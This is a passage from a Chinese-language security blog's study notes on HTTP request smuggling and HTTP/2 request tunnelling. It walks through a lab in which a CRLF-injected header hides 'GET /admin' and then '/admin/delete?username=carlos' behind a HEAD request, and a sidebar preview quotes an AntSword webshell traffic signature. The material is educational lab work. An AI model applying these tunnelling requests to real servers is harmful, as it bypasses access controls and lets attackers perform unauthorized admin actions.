<li>认为这是一个合法的HEAD请求（无请求体）。</li>
<li>头部包含<code>foo: bar\r\n...GET /admin...</code>，但前端不解析Header名中的换行符。</li>
</ul>
</li>
<li><p>后端视角</p>
<p>：</p>
<ul>
<li><p>解析Header名时发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>，将其视为</p>
<p>两个独立请求</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD / HTTP/1.1          # 主请求 </span><br><span class="line">GET /admin HTTP/1.1       # 隐藏请求（隧道）</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>结果</p>
<p>：</p>
<ul>
<li>后端处理<code>GET /admin</code>请求，返回管理页面内容。</li>
<li>前端只读取HEAD请求的响应（固定长度），但攻击者从响应截断处获取部分敏感数据。</li>
</ul>
</li>
</ol>
<ul>
<li><strong>隧道作用</strong>：通过一个请求触发后端执行隐藏的高权限操作。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="阶段4：删除用户（最终攻击）"><a href="#阶段4：删除用户（最终攻击）" class="headerlink" title="阶段4：删除用户（最终攻击）"></a><strong>阶段4：删除用户（最终攻击）</strong></h4><ul>
<li><p><strong>操作</strong>：隧道请求路径改为<code>/admin/delete?username=carlos</code>。</p>
</li>
<li><p>隧道体现</p>
<p>：</p>
<ul>
<li><p><strong>前端视角</strong>：仍认为是一个HEAD请求，无副作用。</p>
</li>
<li><p>后端视角</p>
<p>：处理了两个请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD /login HTTP/1.1          # 主请求（伪装）</span><br><span class="line">GET /admin/delete?... HTTP/1.1 # 隐藏请求（实际攻击）</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>结果</strong>：用户<code>carlos</code>被删除，实验完成。</p>
</li>
<li><p><strong>隧道作用</strong>：完全隐藏攻击行为，前端无法感知。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="🌰-生活化类比"><a href="#🌰-生活化类比" class="headerlink" title="🌰 生活化类比"></a><strong>🌰 生活化类比</strong></h3><ol>
<li><strong>快递员（前端）检查包裹</strong>：只检查快递单（请求头），不拆开包裹（请求体）。</li>
<li><strong>攻击者（你）</strong>：在快递单上写“内附贺卡”，实际在包裹里藏了“销毁货物指令”（隐藏请求）。</li>
<li><strong>仓库（后端）</strong>：拆开包裹后，执行“销毁指令”，但快递员只看到“贺卡已送达”。</li>
<li><strong>结果</strong>：货物被销毁，但快递系统（前端）无记录。</li>
</ol>
<hr>
<h3 id="🔍-总结：隧道的关键特征"><a href="#🔍-总结：隧道的关键特征" class="headerlink" title="🔍 总结：隧道的关键特征"></a><strong>🔍 总结：隧道的关键特征</strong></h3><ol>
<li><strong>请求嵌套</strong>：一个外层请求包裹内层恶意请求。</li>
<li><strong>解析差异</strong>：前端和后端对请求边界的理解不同。</li>
<li><strong>隐蔽执行</strong>：恶意请求的响应被前端忽略或部分截断，但攻击效果生效。</li>
</ol>
<hr>
<h3 id="⚡-快速自查：哪里用到了隧道？"><a href="#⚡-快速自查：哪里用到了隧道？" class="headerlink" title="⚡ 快速自查：哪里用到了隧道？"></a><strong>⚡ 快速自查：哪里用到了隧道？</strong></h3><ul>
<li><strong>注入额外请求头</strong>（如<code>GET /admin</code>） → 隧道传递恶意指令。</li>
<li><strong>修改协议或方法</strong>（如HEAD改为POST） → 掩盖隧道请求。</li>
<li><strong>利用响应截断</strong> → 隐藏隧道请求的完整响应。</li>
</ul>
<p><strong>只有同时满足以上三点，才是完整的隧道攻击！</strong></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://cxkhanhan.github.io">han</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/">http://example.com/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">hanblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">请求走私</a></div><div class="post-share"><div class="social-share" data-image="/img/%E5%8F%AF%E5%8F%AF%E8%90%9D.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/05/25/%E8%87%AA%E5%B7%B1%E5%81%9A%E7%9A%84%E7%AE%80%E6%B4%81%E6%80%BB%E7%BB%93(webshell%E6%B5%81%E9%87%8F&amp;%E5%88%A4%E6%96%AD%E5%91%8A%E8%AD%A6%E6%98%AF%E5%90%A6%E8%AF%AF%E6%8A%A5%E7%9A%84%E6%80%9D%E8%B7%AF)/" title="蓝初流量检测的webshell特征总结和误判思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E9%9D%92%E7%9E%B3%E7%8C%AB.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">蓝初流量检测的webshell特征总结和误判思路</div></div><div class="info-2"><div class="info-item-1">antsword每个请求体都存在以@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)开头 并且响应体的返回结果是base64编码发混淆字符，格式为：随机数 base64结果...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/xya.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">han</div><div class="author-info-description">不要再打了呜呜呜。我不想再被打崩了</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cxkhanhan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cxkhanhan" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/kalis_?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1512624649&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:1512624649@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Noobs Love Documenting Everything</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">笔记:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">必要条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AD%98%E5%9C%A8%E8%AF%B7%E6%B1%82%E8%BD%AC%E5%8F%91%E9%93%BE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 存在请求转发链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 协议解析差异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8%EF%BC%88Keep-Alive%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 连接复用（Keep-Alive）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%9D%9E%E6%B3%95%E8%AF%B7%E6%B1%82%E6%9E%84%E9%80%A0%E5%8F%AF%E8%A1%8C%E6%80%A7"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. 非法请求构造可行性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.2.</span> <span class="toc-text">注意事项:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%9C%89%E6%B7%B7%E6%B7%86%E7%9A%84%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E7%9A%84%E5%9F%BA%E7%A1%80%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%80%BB%E7%BB%93%E5%87%BA%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%89%93%E6%B3%95%E8%A7%84%E5%88%99"><span class="toc-number">1.3.</span> <span class="toc-text">在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%B0%E6%83%91"><span class="toc-number">2.</span> <span class="toc-text">困惑:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.0.1.</span> <span class="toc-text">其他使用技巧注意事项:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="toc-number">2.1.</span> <span class="toc-text">到底什么是请求解析差异?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%B7%B7%E6%B7%86%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">各种类型的混淆请求解析差异类型:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#clte-tecl%E7%9A%84%E6%B7%B7%E6%B7%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.1.</span> <span class="toc-text">clte tecl的混淆方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tete%E7%9A%84%E6%B7%B7%E6%B7%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">tete的混淆方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clcl%E7%9A%84%E6%B7%B7%E6%B7%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">clcl的混淆方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cl-0%E7%B1%BB%E5%9E%8B%E5%B9%B6%E4%B8%8D%E9%9C%80%E8%A6%81%E6%B7%B7%E6%B7%86-%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%AF%E4%B8%80%E7%A7%8D%E8%A2%AB%E6%B7%B7%E6%B7%86%E8%BF%87%E7%9A%84"><span class="toc-number">2.2.4.</span> <span class="toc-text">cl.0类型并不需要混淆,本身就是一种被混淆过的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-CL"><span class="toc-number">2.2.5.</span> <span class="toc-text">H2.CL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E7%82%B9-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E9%87%8C%E5%9C%A8HTTP-2%E5%8F%AF%E4%BB%A5%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%94%B9%E6%88%90HTTP-1-1%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%B8%8D%E8%A1%8C%E4%BA%86"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">重点:为什么这里在HTTP&#x2F;2可以的情况下改成HTTP&#x2F;1.1的时候就不行了</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE"><span class="toc-number">2.2.6.</span> <span class="toc-text">H2.TE:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E7%82%B9-%E5%BD%93%E6%88%91%E4%BB%AC%E5%9C%A8%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E%E5%AF%B9HTTP-2%E6%94%B9%E6%88%90HTTP-1-1%E5%8F%91%E7%8E%B0%E4%B8%8D%E8%83%BD%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">重点:当我们在成功之后对HTTP&#x2F;2改成HTTP&#x2F;1.1发现不能请求走私的原因:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-0-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.7.</span> <span class="toc-text">H2.0 漏洞:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">2.3.</span> <span class="toc-text">使用场景利用点:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E4%B8%8A%E9%9D%A2%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%AF%B9%E4%B8%80%E4%B8%AA%E8%AF%B7%E6%B1%82%E7%9A%84%E6%8F%90%E5%89%8D%E6%88%AA%E6%AD%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%B3%95%E6%88%91%E4%BB%AC%E8%BF%98%E5%8F%AF%E4%BB%A5%E5%9C%A8%E6%9C%80%E5%90%8E%E5%8A%A0%E4%B8%A4%E4%B8%AA-r-n%E8%AE%A9%E4%BB%96%E5%8F%98%E6%88%90%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个\r\n让他变成一个完整的请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-%E5%93%8D%E5%BA%94%E6%8A%95%E6%AF%92"><span class="toc-number">2.4.</span> <span class="toc-text">使用场景:响应投毒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8C%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="toc-number">2.4.1.</span> <span class="toc-text">概念:缓存投毒和缓存欺骗:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A1%88%E4%BE%8B"><span class="toc-number">2.4.2.</span> <span class="toc-text">靶场案例:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP2%E4%B8%8B%E5%85%B3%E4%BA%8E%E7%BB%95%E8%BF%87CL%E5%92%8Cte%E7%9A%84%E6%A3%80%E6%B5%8B%E6%89%8B%E6%B3%95"><span class="toc-number">2.5.</span> <span class="toc-text">HTTP2下关于绕过CL和te的检测手法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http2%E9%87%8C%E7%9A%84%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E2%80%93%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%9A%84%E5%8F%98%E7%A7%8D"><span class="toc-number">3.</span> <span class="toc-text">http2里的请求隧道攻击–请求走私的变种:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E7%9A%84crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-number">4.</span> <span class="toc-text">请求隧道的crlf注入漏洞的原理图:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E8%B5%B0%E7%A7%81%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E7%AC%94%E8%AE%B0%E5%92%8C%E5%BD%93%E5%89%8D%E6%AF%94%E8%BE%83%E6%9C%89%E9%98%B6%E6%AE%B5%E6%80%A7%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">请求隧道走私缓存投毒笔记和当前比较有阶段性的总结:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E5%90%8C%E6%AD%A5"><span class="toc-number">6.</span> <span class="toc-text">客户端不同步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%9F%BA%E4%BA%8E%E6%9A%82%E5%81%9C%E7%9A%84%E4%B8%8D%E5%90%8C%E6%AD%A5"><span class="toc-number">7.</span> <span class="toc-text">服务器端基于暂停的不同步</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AI%E2%80%94-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%9A%84%E8%AE%B2%E8%A7%A3%E4%B8%BE%E4%BE%8B"><span class="toc-number"></span> <span class="toc-text">AI—-基础知识的讲解举例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eai%E5%AF%B9%E5%B0%8F%E6%80%BB%E7%BB%93%E7%9A%84%E8%A1%A5%E5%85%85%E5%92%8C%E5%88%86%E6%9E%90"><span class="toc-number">0.1.</span> <span class="toc-text">关于ai对小总结的补充和分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%86%E5%9D%97%E6%A0%BC%E5%BC%8F%E6%B7%B7%E6%B7%86"><span class="toc-number">0.1.0.1.</span> <span class="toc-text">(2) 分块格式混淆</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%AF%B7%E6%B1%82%E4%BD%93%E6%B7%B7%E6%B7%86"><span class="toc-number">0.1.0.2.</span> <span class="toc-text">(3) 请求体混淆</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%B9-TE-TE-%E5%9C%BA%E6%99%AF%E7%9A%84%E8%A1%A5%E5%85%85"><span class="toc-number">0.1.1.</span> <span class="toc-text">3. 对 TE.TE 场景的补充</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-CL-CL-%E5%9C%BA%E6%99%AF%E7%9A%84%E4%BF%AE%E6%AD%A3"><span class="toc-number">0.1.2.</span> <span class="toc-text">4. CL.CL 场景的修正</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-CL-0-%E5%9C%BA%E6%99%AF%E7%9A%84%E6%BE%84%E6%B8%85"><span class="toc-number">0.1.3.</span> <span class="toc-text">5. CL.0 场景的澄清</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E6%B7%B7%E6%B7%86%E7%9A%84%E6%A0%B8%E5%BF%83%E7%9B%AE%E6%A0%87%E4%B8%8E%E5%AE%9E%E6%88%98%E7%AD%96%E7%95%A5"><span class="toc-number">0.2.</span> <span class="toc-text">总结：混淆的核心目标与实战策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C%E8%A7%A3%E9%87%8A"><span class="toc-number">0.3.</span> <span class="toc-text">你的测试结果解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%AD%A3%E5%90%8E%E7%9A%84%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="toc-number">0.4.</span> <span class="toc-text">修正后的实战建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-RFC%E6%98%AFHTTP%E8%AF%B7%E6%B1%82%E7%9A%84%E2%80%9C%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99%E4%B9%A6%E2%80%9D"><span class="toc-number">0.5.</span> <span class="toc-text">1. RFC是HTTP请求的“语法规则书”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A6%82%E4%BD%95%E2%80%9C%E6%8B%86%E8%A7%A3%E2%80%9D%E8%AF%B7%E6%B1%82"><span class="toc-number">0.6.</span> <span class="toc-text">2. 请求解析：服务器如何“拆解”请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-RFC%E4%B8%8E%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">0.7.</span> <span class="toc-text">3. RFC与请求走私漏洞的关系</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1%EF%BC%9ACL-TE%E6%94%BB%E5%87%BB%EF%BC%88%E5%89%8D%E7%AB%AF%E7%94%A8Content-Length%EF%BC%8C%E5%90%8E%E7%AB%AF%E7%94%A8Transfer-Encoding%EF%BC%89"><span class="toc-number">0.7.1.</span> <span class="toc-text">场景1：CL.TE攻击（前端用Content-Length，后端用Transfer-Encoding）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2%EF%BC%9ATE-TE%E6%94%BB%E5%87%BB%EF%BC%88%E5%89%8D%E5%90%8E%E7%AB%AF%E5%9D%87%E7%94%A8Transfer-Encoding%EF%BC%8C%E4%BD%86%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%EF%BC%89"><span class="toc-number">0.7.2.</span> <span class="toc-text">场景2：TE.TE攻击（前后端均用Transfer-Encoding，但解析不一致）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B7%B7%E6%B7%86%E8%AF%B7%E6%B1%82%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">0.8.</span> <span class="toc-text">4. 为什么混淆请求能绕过防御？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9ARFC%E4%B8%8E%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">0.9.</span> <span class="toc-text">总结：RFC与请求解析的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E6%AF%94%E7%90%86%E8%A7%A3"><span class="toc-number">0.10.</span> <span class="toc-text">类比理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E7%9A%84%E6%A6%82%E5%BF%B5%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">请求隧道攻击的概念讲解:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">概念讲解:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%89%88%EF%BC%9AHTTP%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">通俗易懂版：HTTP请求隧道攻击详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFHTTP%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%EF%BC%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 什么是HTTP请求隧道？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%9A%A7%E9%81%93-vs-%E4%BC%A0%E7%BB%9F%E8%B5%B0%E7%A7%81%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 隧道 vs 传统走私的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD%EF%BC%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 为什么能绕过前端安全措施？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%B0-%E7%94%9F%E6%B4%BB%E5%8C%96%E6%A1%88%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">🌰 生活化案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A7-%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E6%8B%86%E8%A7%A3"><span class="toc-number">1.4.</span> <span class="toc-text">🔧 技术细节拆解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-1-%E4%B8%8E-HTTP-2-%E7%9A%84%E9%9A%A7%E9%81%93%E5%B7%AE%E5%BC%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">HTTP&#x2F;1 与 HTTP&#x2F;2 的隧道差异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E9%9A%A7%E9%81%93-vs-%E9%9D%9E%E7%9B%B2%E9%9A%A7%E9%81%93"><span class="toc-number">1.4.2.</span> <span class="toc-text">盲隧道 vs 非盲隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E9%9A%A7%E9%81%93%EF%BC%88%E4%BD%A0%E8%92%99%E7%9D%80%E7%9C%BC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">盲隧道（你蒙着眼攻击）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E7%9B%B2%E9%9A%A7%E9%81%93%EF%BC%88%E7%9D%81%E7%9D%80%E7%9C%BC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">非盲隧道（睁着眼攻击）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A1-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%EF%BC%88%E4%BB%A5%E9%9D%9E%E7%9B%B2%E9%9A%A7%E9%81%93%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">⚡ 攻击步骤（以非盲隧道为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0%E9%9A%A7%E9%81%93%E8%AF%B7%E6%B1%82"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 构造隧道请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 